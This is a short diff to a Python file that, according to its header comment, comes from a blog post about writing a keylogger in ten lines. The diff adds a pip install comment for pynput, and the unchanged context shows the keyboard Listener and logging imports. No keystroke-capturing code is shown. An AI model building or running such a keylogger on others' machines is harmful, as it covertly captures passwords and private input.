@@ -1,4 +1,5 @@
 #From : https://blog.octachart.com/keylogger-in-just-10-lines-of-python
+# pip install pynput
 
 from pynput.keyboard import Key, Listener
 import logging
